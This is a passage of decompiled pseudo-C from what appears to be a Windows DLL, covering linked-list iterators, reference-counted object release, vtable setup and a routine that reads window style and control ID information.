  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 28);
  this[3] = result;
  return result;
}

//----- (10005F18) --------------------------------------------------------
int __thiscall sub_10005F18(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 32);
  this[2] = result;
  return result;
}

//----- (10005F45) --------------------------------------------------------
void __thiscall sub_10005F45(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  void *v7; // ebx
  int pExceptionObject; // [esp+Ch] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 28);
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    *(_DWORD *)(v4 + 28) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 32) = *(_DWORD *)(this + 8);
  v5 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v5 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 8) = *(_DWORD *)(this + 8);
  v7 = *(void **)(this + 12);
  if ( v7 )
  {
    sub_10005C40(*(int **)(this + 12));
    j__free(v7);
  }
  *(_DWORD *)(this + 12) = v3;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
}

//----- (10005FC4) --------------------------------------------------------
_DWORD *__thiscall sub_10005FC4(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[7]; // [esp-24h] [ebp-40h] BYREF
  int v7; // [esp-8h] [ebp-24h]
  int v8; // [esp-4h] [ebp-20h]
  int *v9; // [esp+8h] [ebp-14h]
  void *Block; // [esp+Ch] [ebp-10h]
  int v11; // [esp+18h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x24u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_10004A45(a2, v6);
    LOBYTE(v11) = 0;
    result = sub_100066A8(Block, v6[0], v6[1], v6[2], v6[3], v6[4], v6[5], v6[6], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 28) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 32) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (10006053) --------------------------------------------------------
_DWORD *__thiscall sub_10006053(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10072DF8;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_10072F30;
  a2[3] = a3;
  return result;
}
// 10072DF8: using guessed type int (__thiscall *off_10072DF8)(void *Block, char);
// 10072F30: using guessed type int (__thiscall *off_10072F30)(void *Block, char);

//----- (10006091) --------------------------------------------------------
void *__thiscall sub_10006091(_DWORD *this)
{
  void *result; // eax

  result = &loc_1005F68E;
  *this = &off_10072F30;
  *this = &off_10072DF8;
  return result;
}
// 10072DF8: using guessed type int (__thiscall *off_10072DF8)(void *Block, char);
// 10072F30: using guessed type int (__thiscall *off_10072F30)(void *Block, char);

//----- (100060BB) --------------------------------------------------------
BOOL __thiscall sub_100060BB(_DWORD *this)
{
  return this[3] == 0;
}

//----- (100060C4) --------------------------------------------------------
BOOL __thiscall sub_100060C4(_DWORD *this)
{
  return this[2] != 0;
}

//----- (100060CD) --------------------------------------------------------
int __thiscall sub_100060CD(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (100060F1) --------------------------------------------------------
int __thiscall sub_100060F1(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 28);
  this[3] = result;
  return result;
}

//----- (1000611E) --------------------------------------------------------
int __thiscall sub_1000611E(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 32);
  this[2] = result;
  return result;
}

//----- (1000614B) --------------------------------------------------------
void __thiscall sub_1000614B(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  void *v7; // ebx
  int pExceptionObject; // [esp+Ch] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 28);
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    *(_DWORD *)(v4 + 28) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 32) = *(_DWORD *)(this + 8);
  v5 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v5 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 8) = *(_DWORD *)(this + 8);
  v7 = *(void **)(this + 12);
  if ( v7 )
  {
    sub_10005C40(*(int **)(this + 12));
    j__free(v7);
  }
  *(_DWORD *)(this + 12) = v3;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
}

//----- (100061CA) --------------------------------------------------------
_DWORD *__thiscall sub_100061CA(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[7]; // [esp-24h] [ebp-40h] BYREF
  int v7; // [esp-8h] [ebp-24h]
  int v8; // [esp-4h] [ebp-20h]
  int *v9; // [esp+8h] [ebp-14h]
  void *Block; // [esp+Ch] [ebp-10h]
  int v11; // [esp+18h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x24u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_10004A45(a2, v6);
    LOBYTE(v11) = 0;
    result = sub_100066A8(Block, v6[0], v6[1], v6[2], v6[3], v6[4], v6[5], v6[6], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 28) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 32) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (10006259) --------------------------------------------------------
_DWORD *__thiscall sub_10006259(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10072ED0;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_10072F50;
  a2[3] = a3;
  return result;
}
// 10072ED0: using guessed type int (__thiscall *off_10072ED0)(void *Block, char);
// 10072F50: using guessed type int (__thiscall *off_10072F50)(void *Block, char);

//----- (10006297) --------------------------------------------------------
void *__thiscall sub_10006297(_DWORD *this)
{
  void *result; // eax

  result = &loc_1005F66A;
  *this = &off_10072F50;
  *this = &off_10072ED0;
  return result;
}
// 10072ED0: using guessed type int (__thiscall *off_10072ED0)(void *Block, char);
// 10072F50: using guessed type int (__thiscall *off_10072F50)(void *Block, char);

//----- (100062C1) --------------------------------------------------------
BOOL __thiscall sub_100062C1(_DWORD *this)
{
  return this[3] == 0;
}

//----- (100062CA) --------------------------------------------------------
BOOL __thiscall sub_100062CA(_DWORD *this)
{
  return this[2] != 0;
}

//----- (100062D3) --------------------------------------------------------
int __thiscall sub_100062D3(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (100062F7) --------------------------------------------------------
int __thiscall sub_100062F7(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 4);
  this[3] = result;
  return result;
}

//----- (10006324) --------------------------------------------------------
int __thiscall sub_10006324(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 8);
  this[2] = result;
  return result;
}

//----- (10006351) --------------------------------------------------------
void __thiscall sub_10006351(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 4);
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    *(_DWORD *)(v4 + 4) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 8) = *(_DWORD *)(this + 8);
  v5 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v5 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 8) = *(_DWORD *)(this + 8);
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = v3;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
}

//----- (100063C3) --------------------------------------------------------
_DWORD *__thiscall sub_100063C3(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // edx
  int v6; // ecx
  int v7; // ecx

  ++*(_DWORD *)(this[1] + 12);
  result = operator new(0xCu);
  if ( result )
  {
    v4 = this[2];
    v5 = this[3];
    *result = *a2;
    result[1] = v5;
    result[2] = v4;
  }
  else
  {
    result = 0;
  }
  v6 = this[2];
  if ( !v6 )
    v6 = this[1];
  *(_DWORD *)(v6 + 4) = result;
  v7 = this[3];
  this[2] = result;
  if ( !v7 )
    v7 = this[1];
  *(_DWORD *)(v7 + 8) = result;
  return result;
}

//----- (10006433) --------------------------------------------------------
_DWORD *__thiscall sub_10006433(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10072EF0;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_10072F70;
  a2[3] = a3;
  return result;
}
// 10072EF0: using guessed type int (__thiscall *off_10072EF0)(void *Block, char);
// 10072F70: using guessed type int (__thiscall *off_10072F70)(void *Block, char);

//----- (10006471) --------------------------------------------------------
void *__thiscall sub_10006471(_DWORD *this)
{
  void *result; // eax

  result = &loc_1005F646;
  *this = &off_10072F70;
  *this = &off_10072EF0;
  return result;
}
// 10072EF0: using guessed type int (__thiscall *off_10072EF0)(void *Block, char);
// 10072F70: using guessed type int (__thiscall *off_10072F70)(void *Block, char);

//----- (1000649B) --------------------------------------------------------
BOOL __thiscall sub_1000649B(_DWORD *this)
{
  return this[3] == 0;
}

//----- (100064A4) --------------------------------------------------------
BOOL __thiscall sub_100064A4(_DWORD *this)
{
  return this[2] != 0;
}

//----- (100064AD) --------------------------------------------------------
int __thiscall sub_100064AD(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (100064D1) --------------------------------------------------------
int __thiscall sub_100064D1(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 4);
  this[3] = result;
  return result;
}

//----- (100064FE) --------------------------------------------------------
int __thiscall sub_100064FE(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 8);
  this[2] = result;
  return result;
}

//----- (1000652B) --------------------------------------------------------
void __thiscall sub_1000652B(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 4);
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    *(_DWORD *)(v4 + 4) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 8) = *(_DWORD *)(this + 8);
  v5 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v5 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 8) = *(_DWORD *)(this + 8);
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = v3;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
}

//----- (1000659D) --------------------------------------------------------
_DWORD *__thiscall sub_1000659D(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // edx
  int v6; // ecx
  int v7; // ecx

  ++*(_DWORD *)(this[1] + 12);
  result = operator new(0xCu);
  if ( result )
  {
    v4 = this[2];
    v5 = this[3];
    *result = *a2;
    result[1] = v5;
    result[2] = v4;
  }
  else
  {
    result = 0;
  }
  v6 = this[2];
  if ( !v6 )
    v6 = this[1];
  *(_DWORD *)(v6 + 4) = result;
  v7 = this[3];
  this[2] = result;
  if ( !v7 )
    v7 = this[1];
  *(_DWORD *)(v7 + 8) = result;
  return result;
}

//----- (1000660D) --------------------------------------------------------
_DWORD *__thiscall sub_1000660D(_DWORD *Block, char a2)
{
  sub_10005E8B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10006629) --------------------------------------------------------
_DWORD *__thiscall sub_10006629(_DWORD *Block, char a2)
{
  sub_10006091(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10006645) --------------------------------------------------------
_DWORD *__thiscall sub_10006645(_DWORD *Block, char a2)
{
  sub_10006297(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10006661) --------------------------------------------------------
_DWORD *__thiscall sub_10006661(_DWORD *Block, char a2)
{
  sub_10006471(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100066A8) --------------------------------------------------------
_DWORD *__stdcall sub_100066A8(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10)
{
  sub_10004A45(&a2, a1);
  a1[7] = a9;
  a1[8] = a10;
  sub_10006D31(&a2);
  return a1;
}

//----- (10006715) --------------------------------------------------------
_DWORD *__stdcall sub_10006715(_DWORD *a1)
{
  sub_10002B1B(a1);
  *a1 = &off_10072948;
  sub_10002B9E(a1, 16);
  return a1;
}
// 10072948: using guessed type int (__thiscall *off_10072948)(void *Block, char);

//----- (10006766) --------------------------------------------------------
_DWORD *__userpurge sub_10006766@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (100067AA) --------------------------------------------------------
void __thiscall sub_100067AA(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_100069C0((int)this);
}

//----- (100067FD) --------------------------------------------------------
_DWORD *__userpurge sub_100067FD@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10006841) --------------------------------------------------------
void __thiscall sub_10006841(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_100069FA((int)this);
}

//----- (10006894) --------------------------------------------------------
_DWORD *__userpurge sub_10006894@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (100068D8) --------------------------------------------------------
void __thiscall sub_100068D8(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10006A34((int)this);
}

//----- (1000692B) --------------------------------------------------------
_DWORD *__userpurge sub_1000692B@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (1000696F) --------------------------------------------------------
void __thiscall sub_1000696F(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10006A6E((int)this);
}

//----- (100069C0) --------------------------------------------------------
void __usercall sub_100069C0(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100069FA) --------------------------------------------------------
void __usercall sub_100069FA(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10006A34) --------------------------------------------------------
void __usercall sub_10006A34(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10006A6E) --------------------------------------------------------
void __usercall sub_10006A6E(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10006ABE) --------------------------------------------------------
_DWORD *__stdcall sub_10006ABE(_DWORD *a1, int a2, int a3)
{
  sub_10003E8E(a1);
  *a1 = &off_10072F90;
  sub_10009F32(a1 + 2, (int)&a2);
  a1[1] = 3002;
  sub_10009F65(&a2);
  return a1;
}
// 10072F90: using guessed type int (__thiscall *off_10072F90)(void *Block, char);

//----- (10006B15) --------------------------------------------------------
int *__thiscall sub_10006B15(int *Block, char a2)
{
  sub_10006B31(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10006B31) --------------------------------------------------------
void __thiscall sub_10006B31(int *this)
{
  *this = (int)&off_10072F90;
  sub_10009F65(this + 2);
  sub_10003EDF(this);
}
// 10072F90: using guessed type int (__thiscall *off_10072F90)(void *Block, char);

//----- (10006B6C) --------------------------------------------------------
char sub_10006B6C()
{
  return 1;
}

//----- (10006B6F) --------------------------------------------------------
char sub_10006B6F()
{
  return 1;
}

//----- (10006B72) --------------------------------------------------------
int __thiscall sub_10006B72(unsigned __int16 *this, int *a2)
{
  int v3; // ecx
  int v4; // eax
  int v6; // [esp-8h] [ebp-38h] BYREF
  int v7; // [esp-4h] [ebp-34h]
  _DWORD v8[9]; // [esp+0h] [ebp-30h] BYREF
  int v9; // [esp+2Ch] [ebp-4h]

  v8[8] = v8;
  sub_1000408E(this, a2);
  v9 = 0;
  v7 = v3;
  v6 = v3;
  sub_10009F32(&v6, (int)(this + 4));
  LOBYTE(v9) = 1;
  v4 = *a2;
  LOBYTE(v9) = 0;
  return (*(int (__thiscall **)(int *, int, int))(v4 + 72))(a2, v6, v7);
}
// 10006B97: variable 'v3' is possibly undefined

//----- (10006BE1) --------------------------------------------------------
int sub_10006BE1()
{
  return 48;
}

//----- (10006BE5) --------------------------------------------------------
_DWORD *__stdcall sub_10006BE5(_DWORD *a1, HWND hwnd)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  int v5; // [esp+0h] [ebp-68h] BYREF
  struct tagWINDOWINFO pwi; // [esp+10h] [ebp-58h] BYREF
  int v7[4]; // [esp+4Ch] [ebp-1Ch] BYREF
  int v8; // [esp+64h] [ebp-4h]

  v7[3] = (int)&v5;
  sub_10009D2C(a1, &word_1008FAC8);
  v8 = 0;
  sub_10009D2C(a1 + 2, &word_1008FACC);
  LOBYTE(v8) = 1;
  a1[4] = 0;
  a1[5] = 0;
  a1[6] = 0;
  if ( hwnd )
  {
    LOBYTE(v8) = 2;
    v2 = sub_100096BA(v7, hwnd);
    LOBYTE(v8) = 3;
    sub_100021B1(v2 + 1, a1 + 1);
    LOBYTE(v8) = 2;
    sub_10009F65(v7);
    v8 = 5;
    v3 = sub_1000976E(v7, hwnd);
    LOBYTE(v8) = 6;
    sub_100021B1(v3 + 1, a1 + 3);
    LOBYTE(v8) = 5;
    sub_10009F65(v7);
    v8 = 1;
    memset(&pwi, 0, sizeof(pwi));
    if ( GetWindowInfo(hwnd, &pwi) )
    {
      a1[5] = pwi.dwStyle;
      a1[6] = pwi.dwExStyle;
    }
    a1[4] = GetDlgCtrlID(hwnd);
  }
  return a1;
}

//----- (10006D31) --------------------------------------------------------
void __stdcall sub_10006D31(int *a1)
{
  sub_10009F65(a1 + 2);
  sub_10009F65(a1);
}

//----- (10006D65) --------------------------------------------------------
_DWORD *__stdcall sub_10006D65(_DWORD *a1)
{
  sub_10006F72(a1);
  *a1 = &off_10072FA8;
  return a1;
}
// 10072FA8: using guessed type int (*off_10072FA8)();

//----- (10006D98) --------------------------------------------------------
_DWORD *__thiscall sub_10006D98(_DWORD *Block, char a2)
{
  sub_10006DB4(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10006DB4) --------------------------------------------------------
void *__thiscall sub_10006DB4(_DWORD *this)
{
  *this = &off_10072FA8;
  return sub_10006FD4(this);
}
// 10072FA8: using guessed type int (*off_10072FA8)();

//----- (10006DDD) --------------------------------------------------------
char __thiscall sub_10006DDD(volatile LONG *this, int a2, int a3)
{
  _DWORD *v3; // eax
  int v5; // [esp-14h] [ebp-64h]
  volatile LONG *v6; // [esp-8h] [ebp-58h] BYREF
  volatile LONG *v7; // [esp-4h] [ebp-54h]
  int v8; // [esp+0h] [ebp-50h] BYREF
  int v9[10]; // [esp+Ch] [ebp-44h] BYREF
  int v10[4]; // [esp+34h] [ebp-1Ch] BYREF
  int v11; // [esp+4Ch] [ebp-4h]

  v10[3] = (int)&v8;
  v11 = 1;
  v7 = this;
  v6 = this;
  v10[2] = (int)&v6;
  sub_10018B3B(&v6);
  LOBYTE(v11) = 2;
  v3 = sub_1000BA21(v10, (int)&a2);
  LOBYTE(v11) = 3;
  v5 = sub_1000BB4C((int)v3);
  LOBYTE(v11) = 4;
  sub_10017C15(-1, 0x80000000, v9, v5, 128, -1, (int)v6, v7);
  LOBYTE(v11) = 6;
  sub_1000BA51(v10);
  sub_10017DBD(v9);
  sub_100185DD(v9);
  sub_10017F33((HANDLE *)v9);
  LOBYTE(v11) = 1;
  sub_10017D5E((int)v9);
  v11 = -1;
  sub_10009F65(&a2);
  return 1;
}

//----- (10006EA7) --------------------------------------------------------
void __thiscall sub_10006EA7(void *this, int a2, int a3)
{
  int v3; // [esp-8h] [ebp-28h] BYREF
  int v4; // [esp-4h] [ebp-24h]
  int v5[5]; // [esp+0h] [ebp-20h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  v6 = 0;
  v4 = (int)this;
  v3 = (int)this;
  v5[4] = (int)&v3;
  sub_10009F32(&v3, (int)&a2);
  LOBYTE(v6) = 0;
  sub_100047E7(v5, v3, v4);
  LOBYTE(v6) = 2;
  sub_100044E6(v5);
  LOBYTE(v6) = 0;
  sub_1000485A(v5);
  v6 = -1;
  sub_10009F65(&a2);
}

//----- (10006F0E) --------------------------------------------------------
_DWORD *__stdcall sub_10006F0E(_DWORD *a1)
{
  int v2[22]; // [esp+8h] [ebp-98h] BYREF
  int v3[12]; // [esp+60h] [ebp-40h] BYREF
  int v4; // [esp+90h] [ebp-10h]
  int v5; // [esp+9Ch] [ebp-4h]

  v4 = 0;
  sub_100035BB();
  sub_100016F0(dword_10091C08, v2);
  v5 = 1;
  sub_100021D4(v3, a1);
  v4 = 1;
  LOBYTE(v5) = 0;
  sub_100010A5(v2);
  return a1;
}
// 10091C08: using guessed type int dword_10091C08;
// 10006F0E: using guessed type int var_98[22];
// 10006F0E: using guessed type int var_40[12];

//----- (10006F72) --------------------------------------------------------
_DWORD *__stdcall sub_10006F72(_DWORD *a1)
{
  *a1 = &off_10072FD4;
  sub_100084B7(a1 + 1);
  sub_100084B7(a1 + 11);
  return a1;
}
// 10072FD4: using guessed type int (*off_10072FD4)();

//----- (10006FB1) --------------------------------------------------------
_DWORD *__thiscall sub_10006FB1(_DWORD *Block, char a2)
{
  sub_10006FD4(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10006FD4) --------------------------------------------------------
void *__thiscall sub_10006FD4(_DWORD *this)
{
  *this = &off_10072FD4;
  sub_100084E9(this + 11);
  return sub_100084E9(this + 1);
}
// 10072FD4: using guessed type int (*off_10072FD4)();

//----- (10007010) --------------------------------------------------------
void *__thiscall sub_10007010(_DWORD *this)
{
  unsigned __int8 (__thiscall **v2)(int, int); // esi
  int v3; // eax
  int v4; // eax
  void *v5; // ecx
  int (__thiscall **v6)(_DWORD *, unsigned int, void *); // eax
  char v7; // al
  _DWORD *v8; // ebx
  unsigned __int8 (__thiscall **v9)(int, int); // esi
  int v10; // eax
  int v11; // eax
  int v12; // eax
  unsigned int v13; // ecx
  void (__thiscall **v14)(_DWORD *, unsigned int, unsigned int); // eax
  void (__thiscall **v15)(int, int); // esi
